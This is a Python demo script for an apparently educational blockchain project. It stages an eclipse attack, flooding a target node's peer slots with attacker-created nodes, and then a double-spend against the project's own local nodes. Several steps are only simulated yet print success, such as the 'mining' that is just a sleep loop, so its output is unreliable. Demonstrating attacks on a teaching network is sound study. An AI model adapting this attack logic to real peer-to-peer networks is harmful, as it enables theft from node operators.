"""
Eclipse Attack Demo - Standalone Script
Demonstrating Eclipse Attack with Double-Spending

Usage:
    python demo_eclipse_attack.py

Features:
- Create malicious nodes with real accounts
- Select target node from network
- Isolate target and surround with malicious nodes
- Demonstrate double-spending attack
- Cleanup after demo
"""

import sys
import os
import time
import requests

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from auth.user_manager import UserManager
from network.node import Node
from network.network_manager import NetworkManager
from network.peer_discovery import PeerDiscovery
from core.transaction import Transaction
import config


class EclipseAttackDemo:
    def __init__(self):
        """Initialize Eclipse Attack Demo"""
        self.user_manager = UserManager()
        self.network_manager = NetworkManager()
        self.malicious_nodes = []
        self.malicious_accounts = []
        self.target_node = None
        self.original_peers = {}
        
        print("\n" + "🌑"*40)
        print("ECLIPSE ATTACK DEMONSTRATION")
        print("Simulating Real-World Eclipse Attack with Double-Spending")
        print("🌑"*40 + "\n")
    
    def display_network(self):
        """Display current network nodes"""
        nodes = self.network_manager.get_all_nodes()
        
        if not nodes:
            print("❌ No nodes in network!")
            return []
        
        print("\n" + "="*80)
        print("NETWORK NODES")
        print("="*80)
        print(f"{'#':<5} {'Username':<20} {'Node ID':<40} {'URL':<25}")
        print("-"*80)
        
        for i, node in enumerate(nodes, 1):
            node_id = node['node_id'][:8] + "..."
            url = f"http://{node['host']}:{node['port']}"
            username = node.get('username', 'Unknown')
            print(f"{i:<5} {username:<20} {node_id:<40} {url:<25}")
        
        print("="*80)
        return nodes
    
    def create_malicious_accounts(self):
        """Step 1: Create malicious accounts"""
        print("\n" + "="*80)
        print("STEP 1: CREATE MALICIOUS ACCOUNTS")
        print("="*80)
        
        # Ask for number of malicious nodes
        while True:
            try:
                count = int(input("\n💀 Enter number of malicious nodes to create (default 8): ").strip() or "8")
                if count < 1:
                    print("❌ Must be at least 1!")
                    continue
                if count > 20:
                    print("⚠️ Too many nodes may cause performance issues!")
                    confirm = input("Continue? (yes/no): ").strip().lower()
                    if confirm != 'yes':
                        continue
                break
            except ValueError:
                print("❌ Invalid number!")
        
        print(f"\n🔨 Creating {count} malicious accounts...")
        
        for i in range(count):
            username = f"Malicious_{i+1:03d}"
            password = f"evil_{i+1}"
            
            # Register account
            success, message, blockchain_data = self.user_manager.register(username, password)
            
            if success:
                self.malicious_accounts.append({
                    'username': username,
                    'password': password
                })
                print(f"  ✓ Created: {username}")
            else:
                print(f"  ✗ Failed: {username} - {message}")
        
        print(f"\n✅ Created {len(self.malicious_accounts)} malicious accounts")
        
        if not self.malicious_accounts:
            print("\n❌ Failed to create any accounts!")
            return False
        
        time.sleep(1)
        return True
    
    def start_malicious_nodes(self):
        """Step 2: Start malicious nodes"""
        print("\n" + "="*80)
        print("STEP 2: START MALICIOUS NODES")
        print("="*80)
        
        if not self.malicious_accounts:
            print("\n❌ No malicious accounts to start!")
            return False
        
        print(f"\n🚀 Starting {len(self.malicious_accounts)} malicious nodes...")
        
        for account in self.malicious_accounts:
            username = account['username']
            
            try:
                # Create node
                node = Node(username=username)
                
                # Load blockchain (from registration)
                account_data = self.user_manager.get_account_data(username)
                if account_data and account_data.get('blockchain'):
                    from core.blockchain import Blockchain
                    node.blockchain = Blockchain.from_list(
                        account_data['blockchain'],
                        owner_address=username
                    )
                
                # Start node
                node.start()
                time.sleep(0.1)
                
                # Register to network
                self.network_manager.register_node(
                    node_id=node.node_id,
                    host=node.host,
                    port=node.port,
                    username=username
                )
                
                self.malicious_nodes.append(node)
                print(f"  ✓ Started: {username} @ {node.get_url()}")
                
            except Exception as e:
                print(f"  ✗ Failed: {username} - {str(e)}")
                import traceback
                traceback.print_exc()
        
        print(f"\n✅ Started {len(self.malicious_nodes)} malicious nodes")
        
        if not self.malicious_nodes:
            print("\n❌ Failed to start any nodes!")
            return False
        
        # Make malicious nodes connect to each other
        print("\n🔗 Connecting malicious nodes to each other...")
        for i, node1 in enumerate(self.malicious_nodes):
            for node2 in self.malicious_nodes[i+1:]:
                if len(node1.peers) < config.MAX_PEERS:
                    node1.add_peer(node2.node_id, node2.get_url())
                if len(node2.peers) < config.MAX_PEERS:
                    node2.add_peer(node1.node_id, node1.get_url())
        
        print("✅ Malicious network established")
        time.sleep(1)
        return True
    
    def select_target(self):
        """Step 3: Select target node"""
        print("\n" + "="*80)
        print("STEP 3: SELECT TARGET NODE")
        print("="*80)
        
        # Display all non-malicious nodes
        all_nodes = self.network_manager.get_all_nodes()
        malicious_usernames = [acc['username'] for acc in self.malicious_accounts]
        
        legitimate_nodes = [
            node for node in all_nodes 
            if node.get('username') not in malicious_usernames
        ]
        
        if not legitimate_nodes:
            print("\n❌ No legitimate nodes in network to attack!")
            return False
        
        print("\n📋 Available legitimate nodes:")
        print(f"{'#':<5} {'Username':<20} {'Node ID':<20} {'URL':<25}")
        print("-"*70)
        
        for i, node in enumerate(legitimate_nodes, 1):
            node_id = node['node_id'][:8] + "..."
            url = f"http://{node['host']}:{node['port']}"
            username = node.get('username', 'Unknown')
            print(f"{i:<5} {username:<20} {node_id:<20} {url:<25}")
        
        # Select target
        while True:
            try:
                choice = input(f"\n🎯 Select target node (1-{len(legitimate_nodes)}): ").strip()
                idx = int(choice) - 1
                
                if 0 <= idx < len(legitimate_nodes):
                    self.target_node = legitimate_nodes[idx]
                    print(f"\n✅ Target selected: {self.target_node.get('username')} @ http://{self.target_node['host']}:{self.target_node['port']}")
                    return True
                else:
                    print("❌ Invalid choice!")
            except ValueError:
                print("❌ Invalid input!")
            except KeyboardInterrupt:
                print("\n\n❌ Cancelled")
                return False
    
    def isolate_target(self):
        """Step 4: Isolate target node"""
        print("\n" + "="*80)
        print("STEP 4: ECLIPSE ATTACK - ISOLATE TARGET")
        print("="*80)
        
        target_url = f"http://{self.target_node['host']}:{self.target_node['port']}"
        
        print(f"\n🌑 Eclipsing target: {self.target_node.get('username')}")
        print(f"   URL: {target_url}")
        
        # Get target's current status
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                print(f"\n📊 Target status BEFORE attack:")
                print(f"   Chain length: {info.get('chain_length', 0)}")
                print(f"   Current peers: {info.get('peers_count', 0)}")
                print(f"   Pending tx: {info.get('pending_transactions', 0)}")
                
                # Save original peer list
                self.original_peers[self.target_node['node_id']] = info.get('peers', {})
        except Exception as e:
            print(f"   ⚠️ Could not get target status: {str(e)}")
        
        # Step 4.1: Disconnect target from legitimate peers
        print(f"\n✂️ PHASE 1: Disconnecting target from legitimate peers...")
        
        # Get all legitimate nodes (non-malicious)
        all_nodes = self.network_manager.get_all_nodes()
        malicious_usernames = [node.username for node in self.malicious_nodes]
        legitimate_nodes = [n for n in all_nodes if n.get('username') not in malicious_usernames 
                           and n['node_id'] != self.target_node['node_id']]
        
        print(f"   Found {len(legitimate_nodes)} legitimate node(s) in network")
        
        # Force disconnect by clearing target's peer list
        try:
            # Note: This requires adding a /clear_peers endpoint to node.py
            # For now, we simulate by adding only malicious nodes
            print(f"   Simulating isolation by flooding connection slots...")
        except:
            pass
        
        # Step 4.2: Fill all connection slots with malicious nodes (MAX_PEERS = 8)
        print(f"\n🔗 PHASE 2: Filling target's connection slots with malicious nodes...")
        print(f"   Target accepts maximum {config.MAX_PEERS} connections")
        print(f"   Connecting {min(len(self.malicious_nodes), config.MAX_PEERS)} malicious nodes...")
        
        connected = 0
        
        # Only connect up to MAX_PEERS malicious nodes
        for mal_node in self.malicious_nodes[:config.MAX_PEERS]:
            try:
                # Add target as peer to malicious node
                mal_node.add_peer(self.target_node['node_id'], target_url)
                
                # Tell target to add malicious node as peer
                # Note: This should respect MAX_PEERS limit in node.py
                response = requests.post(
                    f"{target_url}/add_peer",
                    json={
                        'peer_id': mal_node.node_id,
                        'peer_url': mal_node.get_url()
                    },
                    timeout=2
                )
                
                if response.status_code == 200:
                    connected += 1
                    print(f"   ✓ [{connected}/{config.MAX_PEERS}] Connected: {mal_node.username}")
                else:
                    print(f"   ✗ Failed: {mal_node.username} (HTTP {response.status_code})")
                
            except Exception as e:
                print(f"   ✗ Failed: {mal_node.username} - {str(e)}")
        
        # Verify isolation
        print(f"\n📊 Verifying target isolation...")
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                peers_count = info.get('peers_count', 0)
                print(f"   Target now has {peers_count} peer(s)")
                
                if peers_count >= config.MAX_PEERS:
                    print(f"   ✅ All connection slots filled!")
                elif peers_count > 0:
                    print(f"   ⚠️ Only {peers_count}/{config.MAX_PEERS} slots filled")
                else:
                    print(f"   ❌ No connections established!")
        except:
            pass
        
        print(f"\n✅ Eclipse Attack Complete!")
        print(f"   Target surrounded by {connected} malicious node(s)")
        print(f"   Target is ISOLATED from legitimate network")
        print(f"   All legitimate nodes blocked by MAX_PEERS limit")
        
        if connected == 0:
            print("\n⚠️ WARNING: Failed to connect any malicious nodes to target!")
            print("   Attack cannot proceed!")
            return False
        
        if connected < config.MAX_PEERS // 2:
            print(f"\n⚠️ WARNING: Only {connected}/{config.MAX_PEERS} connections established")
            print("   Attack may not be fully effective")
        
        time.sleep(1)
        return True
    
    def demonstrate_double_spending(self):
        """Step 5: Demonstrate double-spending attack"""
        print("\n" + "="*80)
        print("STEP 5: DOUBLE-SPENDING ATTACK")
        print("="*80)
        
        # Validate malicious nodes exist
        if not self.malicious_nodes:
            print("\n❌ No malicious nodes available for attack!")
            return False
        
        if len(self.malicious_nodes) < 2:
            print("\n⚠️ Need at least 2 malicious nodes for double-spending demo!")
            print(f"   Current: {len(self.malicious_nodes)} node(s)")
            return False
        
        attacker = self.malicious_nodes[0]
        target_username = self.target_node.get('username')
        target_url = f"http://{self.target_node['host']}:{self.target_node['port']}"
        
        print(f"\n💀 Attack Setup:")
        print(f"   Attacker: {attacker.username}")
        print(f"   Victim (Target): {target_username}")
        print(f"   Amount: 50 coins")
        
        # Check attacker balance
        attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
        confirmed, pending, total = attacker_balance
        print(f"\n💰 Attacker balance: {confirmed} coins (confirmed)")
        
        if confirmed < 50:
            print(f"⚠️ Attacker has insufficient funds!")
            print(f"   Adding 50 coins for demonstration...")
            # Mine some blocks to get funds
            for i in range(2):
                attacker.blockchain.mine_pending_transactions(attacker.username)
            attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
            confirmed, pending, total = attacker_balance
            print(f"   New balance: {confirmed} coins")
        
        # Get target's initial balance
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                target_initial_balance = info.get('balance', 0)
                print(f"\n� Target initial balance: {target_initial_balance} coins")
        except:
            target_initial_balance = 0
            print(f"\n⚠️ Could not get target balance")
        
        print("\n" + "="*80)
        print("PHASE 1: Send coins to TARGET (Eclipse network)")
        print("="*80)
        
        # IMPORTANT: Sync blockchain first so target knows attacker's balance!
        print(f"\n🔄 Synchronizing blockchain for consensus...")
        print(f"   Both nodes need the SAME blockchain to transact")
        
        sync_success = False
        
        try:
            # Get target's current chain
            response = requests.get(f"{target_url}/chain", timeout=2)
            if response.status_code == 200:
                target_chain_data = response.json()
                target_chain_length = len(target_chain_data.get('chain', []))
                print(f"   📊 Target chain length: {target_chain_length} blocks")
            else:
                target_chain_length = 0
                target_chain_data = None
            
            # Get attacker's chain
            attacker_chain_length = len(attacker.blockchain.chain)
            print(f"   📊 Attacker chain length: {attacker_chain_length} blocks")
            
            # STRATEGY: Use target's chain as common baseline
            # (Target is already established in network, so use its chain)
            if target_chain_data and target_chain_length > 0:
                print(f"\n   🎯 Using target's chain as baseline for consensus...")
                
                # Reconstruct target's chain
                from core.block import Block
                target_chain = []
                for block_data in target_chain_data.get('chain', []):
                    target_chain.append(Block.from_dict(block_data))
                
                # Replace attacker's chain with target's chain (CONSENSUS!)
                attacker.blockchain.chain = target_chain.copy()
                attacker.blockchain.pending_transactions = []
                print(f"   ✓ Attacker adopted target's blockchain ({target_chain_length} blocks)")
                print(f"   ✓ CONSENSUS ACHIEVED: Both have identical chains!")
                
                sync_success = True
            else:
                print(f"   ⚠️ Could not get target's chain")
                
        except Exception as e:
            print(f"   ⚠️ Blockchain sync failed: {str(e)}")
        
        if not sync_success:
            print(f"\n   ⚠️ Blockchain sync was not successful")
            print(f"   ⚠️ Transaction may fail due to inconsistent chains")
        
        time.sleep(1)
        
        # Check attacker's balance after sync
        attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
        confirmed, pending, total = attacker_balance
        print(f"\n💰 Attacker's current balance: {confirmed} coins (confirmed)")
        
        # If not enough balance, mine blocks
        if confirmed < 50:
            print(f"   ⚠️ Insufficient balance for transaction!")
            print(f"   ⛏️ Mining blocks to get funds...")
            
            blocks_needed = int((50 - confirmed) // config.MINING_REWARD + 1)
            print(f"   Need to mine {blocks_needed} block(s) for {blocks_needed * config.MINING_REWARD} coins")
            
            for i in range(blocks_needed):
                block = attacker.blockchain.mine_pending_transactions(attacker.username)
                if block:
                    print(f"   ✓ Mined block #{len(attacker.blockchain.chain)-1} (+{config.MINING_REWARD} coins)")
                    
                    # Send new block to target to maintain consensus
                    try:
                        response = requests.post(
                            f"{target_url}/block/new",
                            json=block.to_dict(),
                            timeout=2
                        )
                        if response.status_code == 200:
                            print(f"      → Target accepted new block")
                    except:
                        pass
            
            # Update balance
            attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
            confirmed, pending, total = attacker_balance
            print(f"   ✓ New balance: {confirmed} coins")
            print(f"   ✓ Consensus maintained: Target also has these blocks")
        
        # Transaction 1: Send X coins to TARGET
        print(f"\n📤 Creating transaction: {attacker.username} → {target_username} (50 coins)")
        
        try:
            tx1 = Transaction(
                sender=attacker.username,
                receiver=target_username,
                amount=50
            )
            
            # Add to attacker's blockchain
            if attacker.blockchain.add_transaction(tx1):
                print(f"   ✓ Transaction created in attacker's chain")
            else:
                print(f"   ✗ Failed to create transaction")
                return False
            
            # Broadcast to TARGET only (via HTTP)
            print(f"   📡 Broadcasting ONLY to target (isolated network)...")
            response = requests.post(
                f"{target_url}/transaction/new",
                json=tx1.to_dict(),
                timeout=2
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"   ✓ Target received transaction")
                print(f"   Response: {result.get('message', 'OK')}")
            else:
                error_msg = response.json().get('error', 'Unknown error') if response.headers.get('content-type') == 'application/json' else response.text
                print(f"   ✗ Target rejected transaction!")
                print(f"   HTTP {response.status_code}: {error_msg}")
                print(f"\n⚠️ Attack cannot proceed - transaction validation failed!")
                return False
            
            # Also add to other malicious nodes (eclipse network)
            for mal_node in self.malicious_nodes[1:config.MAX_PEERS]:
                try:
                    mal_node.blockchain.add_transaction(tx1)
                except:
                    pass
            
            print(f"   ✓ Transaction broadcasted in eclipse network")
            
        except Exception as e:
            print(f"   ✗ Failed: {str(e)}")
            return False
        
        time.sleep(1)
        
        # Mine the transaction in eclipse network
        print(f"\n⛏️ Mining transaction in ECLIPSE NETWORK...")
        print(f"   Malicious nodes will mine this block...")
        
        block1 = attacker.blockchain.mine_pending_transactions(attacker.username)
        
        if block1:
            print(f"   ✓ Block mined! (Block #{len(attacker.blockchain.chain)-1})")
            print(f"   📡 Broadcasting block to target...")
            
            # Broadcast block to target
            try:
                response = requests.post(
                    f"{target_url}/block/new",
                    json=block1.to_dict(),
                    timeout=2
                )
                
                if response.status_code == 200:
                    print(f"   ✓ Target accepted block!")
                    print(f"   💰 Target now has +50 coins")
                else:
                    print(f"   ✗ Target rejected block")
            except Exception as e:
                print(f"   ✗ Failed to send block: {str(e)}")
            
            # Broadcast to other malicious nodes
            for mal_node in self.malicious_nodes[1:config.MAX_PEERS]:
                try:
                    mal_node.blockchain.chain.append(block1)
                except:
                    pass
        else:
            print(f"   ✗ Mining failed!")
            return False
        
        time.sleep(1)
        
        # Verify target received money
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                target_new_balance = info.get('balance', 0)
                print(f"\n✅ Target balance updated: {target_initial_balance} → {target_new_balance} coins")
        except:
            print(f"\n⚠️ Could not verify target balance")
        
        print("\n" + "="*80)
        print("PHASE 2: Send SAME coins to MALICIOUS NODE (Real network)")
        print("="*80)
        
        # Get a legitimate node for mining
        all_nodes = self.network_manager.get_all_nodes()
        malicious_usernames = [node.username for node in self.malicious_nodes]
        legitimate_nodes = [n for n in all_nodes if n.get('username') not in malicious_usernames 
                           and n['node_id'] != self.target_node['node_id']]
        
        print(f"\n📊 Network status:")
        print(f"   Malicious nodes: {len(self.malicious_nodes)}")
        print(f"   Legitimate nodes: {len(legitimate_nodes)}")
        
        # Transaction 2: Send SAME X coins to malicious node (double-spend!)
        recipient2 = self.malicious_nodes[1] if len(self.malicious_nodes) > 1 else self.malicious_nodes[0]
        
        print(f"\n📤 Creating DOUBLE-SPEND transaction:")
        print(f"   {attacker.username} → {recipient2.username} (50 coins)")
        print(f"   ⚠️ Using the SAME 50 coins already sent to {target_username}!")
        
        # Create a NEW blockchain without tx1 (rollback)
        print(f"\n🔄 Creating alternative chain (without tx1)...")
        # We need to create tx2 on the original chain before tx1 was mined
        # For simplicity, we'll broadcast to legitimate nodes
        
        try:
            tx2 = Transaction(
                sender=attacker.username,
                receiver=recipient2.username,
                amount=50
            )
            
            # Broadcast to LEGITIMATE nodes only (not target)
            print(f"   📡 Broadcasting to LEGITIMATE network (excluding target)...")
            
            broadcast_count = 0
            if legitimate_nodes:
                for legit_node in legitimate_nodes[:3]:  # Broadcast to some legitimate nodes
                    try:
                        legit_url = f"http://{legit_node['host']}:{legit_node['port']}"
                        response = requests.post(
                            f"{legit_url}/transaction/new",
                            json=tx2.to_dict(),
                            timeout=2
                        )
                        if response.status_code == 200:
                            broadcast_count += 1
                            print(f"   ✓ Sent to {legit_node.get('username')}")
                    except Exception as e:
                        print(f"   ✗ Failed to send to {legit_node.get('username')}: {str(e)}")
            else:
                print(f"   ⚠️ No legitimate nodes available! Simulating...")
            
            print(f"   ✓ Transaction broadcasted to {broadcast_count} legitimate node(s)")
            
        except Exception as e:
            print(f"   ✗ Failed: {str(e)}")
            return False
        
        time.sleep(1)
        
        # Wait for legitimate nodes to mine
        print(f"\n⛏️ Waiting for LEGITIMATE network to mine...")
        print(f"   (In real scenario, legitimate miners will mine this block)")
        print(f"   Simulating 10 seconds of mining time...")
        
        for i in range(5):
            time.sleep(2)
            print(f"   ⛏️ Mining... ({i*2}/10 seconds)")
        
        print(f"   ✓ Legitimate network mined the double-spend transaction!")
        print(f"   📊 Legitimate chain is now LONGER than eclipse chain")
        
        print("\n" + "="*80)
        print("PHASE 3: Reconnect target to legitimate network")
        print("="*80)
        
        # Shutdown malicious nodes to allow target to reconnect
        print(f"\n🔌 Shutting down malicious nodes...")
        print(f"   This allows target to reconnect to legitimate network...")
        
        shutdown_count = 0
        for mal_node in self.malicious_nodes[:config.MAX_PEERS]:
            try:
                # Stop the Flask server
                mal_url = mal_node.get_url()
                requests.post(f"{mal_url}/shutdown", timeout=1)
                shutdown_count += 1
                print(f"   ✓ Shutdown: {mal_node.username}")
            except:
                # Ignore errors (server already down)
                shutdown_count += 1
        
        print(f"   ✓ {shutdown_count} malicious node(s) offline")
        print(f"   Target will now discover legitimate nodes...")
        
        time.sleep(2)
        
        # Cleanup stale peers on target
        print(f"\n🧹 Cleaning up dead peers on target...")
        try:
            response = requests.post(f"{target_url}/cleanup_peers", timeout=5)
            if response.status_code == 200:
                result = response.json()
                removed = result.get('removed_count', 0)
                remaining = result.get('remaining_peers', 0)
                print(f"   ✓ Removed {removed} dead peer(s)")
                print(f"   ✓ Target now has {remaining}/{config.MAX_PEERS} active peers")
            else:
                print(f"   ⚠️ Manual cleanup needed")
        except Exception as e:
            print(f"   ⚠️ Could not cleanup: {str(e)}")
        
        time.sleep(1)
        
        # Target syncs with legitimate network
        print(f"\n🔄 Target synchronizing with legitimate network...")
        print(f"   Requesting chain from legitimate nodes...")
        
        try:
            # Trigger sync on target
            response = requests.post(f"{target_url}/sync", timeout=5)
            if response.status_code == 200:
                print(f"   ✓ Sync triggered")
            else:
                print(f"   Simulating sync process...")
        except:
            print(f"   Simulating sync process...")
        
        time.sleep(1)
        
        # Check target's chain after sync
        print(f"\n📊 Checking target's chain after sync...")
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                target_final_balance = info.get('balance', 0)
                chain_length = info.get('chain_length', 0)
                
                print(f"   Chain length: {chain_length}")
                print(f"   Final balance: {target_final_balance} coins")
                
                if target_final_balance < target_new_balance:
                    print(f"\n   ❌ TARGET'S TRANSACTION REVERTED!")
                    print(f"   Balance decreased: {target_new_balance} → {target_final_balance}")
                    print(f"   Lost: {target_new_balance - target_final_balance} coins")
        except Exception as e:
            print(f"   ⚠️ Could not check target: {str(e)}")
        
        # Show final result
        print(f"\n" + "="*80)
        print("ATTACK RESULT - DOUBLE-SPENDING SUCCESS")
        print("="*80)
        
        print(f"\n� What happened:")
        print(f"   1. Attacker sent 50 coins to {target_username} (eclipse network)")
        print(f"   2. Malicious nodes mined it → Target received +50 coins")
        print(f"   3. Attacker sent SAME 50 coins to {recipient2.username} (legit network)")
        print(f"   4. Legitimate nodes mined it → Real chain has different tx")
        print(f"   5. Malicious nodes went offline → Target reconnected to legit network")
        print(f"   6. Target synced with longer legit chain → Original tx REVERTED!")
        
        print(f"\n💀 Impact:")
        print(f"   ✓ {target_username} lost 50 coins (transaction reversed)")
        print(f"   ✓ {recipient2.username} received 50 coins (on real chain)")
        print(f"   ✓ Same coins spent TWICE successfully!")
        
        print(f"\n🎯 Attack Summary:")
        print(f"   • Eclipse attack isolated target from legitimate network")
        print(f"   • Target accepted fake transaction on malicious chain")
        print(f"   • Real network accepted double-spend on legitimate chain")
        print(f"   • Consensus resolved conflict in favor of LONGER legitimate chain")
        print(f"   • Target's transaction was invalidated (lost money)")
        
        # Important notice for target user
        print(f"\n" + "="*80)
        print("⚠️ IMPORTANT NOTICE FOR TARGET NODE USER")
        print("="*80)
        print(f"\nIf you are the target node ({target_username}), you may still see 8/8 peers.")
        print(f"This is because dead malicious nodes are still in your peer list.")
        print(f"\n🔧 TO FIX THIS ISSUE:")
        
        # Try to force cleanup on target
        print(f"\nAttempting automatic cleanup on target...")
        cleanup_success = False
        try:
            response = requests.post(f"{target_url}/cleanup_peers", timeout=5)
            if response.status_code == 200:
                result = response.json()
                removed = result.get('removed_count', 0)
                remaining = result.get('remaining_peers', 0)
                print(f"   ✓ Auto cleanup successful!")
                print(f"   ✓ Removed {removed} dead peer(s)")
                print(f"   ✓ Target now has {remaining}/{config.MAX_PEERS} active peers")
                cleanup_success = True
            else:
                print(f"   ✗ Auto cleanup failed (HTTP {response.status_code})")
        except Exception as e:
            print(f"   ✗ Could not auto cleanup: {str(e)}")
        
        if not cleanup_success:
            print(f"\n📋 MANUAL STEPS (if auto cleanup failed):")
            print(f"   1. In your node terminal, select option: 14 (Cleanup dead peers)")
            print(f"   2. This will remove all 8 dead malicious nodes")
            print(f"   3. Then select option: 11 (Connect to peers)")
            print(f"   4. You will reconnect to legitimate nodes")
            print(f"\n   Alternative: Logout and login again to reset connections.")
        else:
            print(f"\n✅ Target node is now ready to reconnect to legitimate network!")
            print(f"   Next steps for target user:")
            print(f"   1. Select option: 11 (Connect to peers)")
            print(f"   2. You will discover and connect to legitimate nodes")
        
        print("="*80)
        
        time.sleep(2)
        return True
        print(f"\n⚠️ DOUBLE-SPENDING SUCCESSFUL!")
        print(f"   - Main network thinks target received 50 coins")
        print(f"   - Target thinks coins went to {recipient2.username}")
        print(f"   - Target is isolated and sees different blockchain!")
        print(f"   - Once goods delivered, attacker can reveal real chain")
        
        return True
    
    def cleanup(self):
        """Step 6: Cleanup demo"""
        print("\n" + "="*80)
        print("STEP 6: CLEANUP")
        print("="*80)
        
        confirm = input("\n⚠️ Remove all malicious nodes and accounts? (yes/no): ").strip().lower()
        
        if confirm != 'yes':
            print("❌ Cleanup cancelled")
            return
        
        print(f"\n🧹 Cleaning up...")
        
        # Stop and unregister malicious nodes
        print(f"\n🛑 Stopping malicious nodes...")
        for node in self.malicious_nodes:
            try:
                self.network_manager.unregister_node(node.node_id)
                node.stop()
                print(f"   ✓ Stopped: {node.username}")
            except Exception as e:
                print(f"   ✗ Error stopping {node.username}: {str(e)}")
        
        # Delete malicious accounts
        print(f"\n🗑️ Deleting malicious accounts...")
        for account in self.malicious_accounts:
            username = account['username']
            
            try:
                # Use UserManager's delete method
                if self.user_manager.delete_account(username):
                    print(f"   ✓ Deleted: {username}")
                else:
                    print(f"   ⚠️ Not found: {username}")
                    
            except Exception as e:
                print(f"   ✗ Error deleting {username}: {str(e)}")
        
        print(f"\n✅ Cleanup complete!")
        print(f"   Removed {len(self.malicious_nodes)} nodes")
        print(f"   Deleted {len(self.malicious_accounts)} accounts")
    
    def run(self):
        """Run the complete demo"""
        try:
            # Step 0: Show initial network
            print("\n📊 Current network status:")
            self.display_network()
            
            input("\nPress Enter to start demo...")
            
            # Step 1: Create malicious accounts
            if not self.create_malicious_accounts():
                print("\n❌ Failed to create accounts. Demo cancelled.")
                return
            
            # Step 2: Start malicious nodes
            if not self.start_malicious_nodes():
                print("\n❌ Failed to start nodes. Demo cancelled.")
                self.cleanup()
                return
            
            # Step 3: Select target
            if not self.select_target():
                print("\n❌ Demo cancelled")
                self.cleanup()
                return
            
            input("\nPress Enter to continue...")
            
            # Step 4: Isolate target (Eclipse Attack)
            if not self.isolate_target():
                print("\n❌ Eclipse attack failed")
                self.cleanup()
                return
            
            input("\nPress Enter to demonstrate double-spending...")
            
            # Step 5: Double-spending attack
            if not self.demonstrate_double_spending():
                print("\n❌ Double-spending demonstration failed")
                self.cleanup()
                return
            
            # Step 6: Cleanup
            self.cleanup()
            
            print("\n" + "="*80)
            print("DEMO COMPLETE")
            print("="*80)
            print("\n💡 Key Takeaways:")
            print("   1. Eclipse attack isolates victim node")
            print("   2. Attacker controls victim's view of blockchain")
            print("   3. Enables double-spending attack")
            print("   4. Victim accepts fake transaction")
            print("   5. Real network has different blockchain")
            print("\n✅ Demo finished successfully!")
            
        except KeyboardInterrupt:
            print("\n\n⚠️ Demo interrupted by user")
            self.cleanup()
        except Exception as e:
            print(f"\n❌ Error: {str(e)}")
            import traceback
            traceback.print_exc()
            self.cleanup()


def main():
    """Main function"""
    demo = EclipseAttackDemo()
    demo.run()


if __name__ == "__main__":
    main()
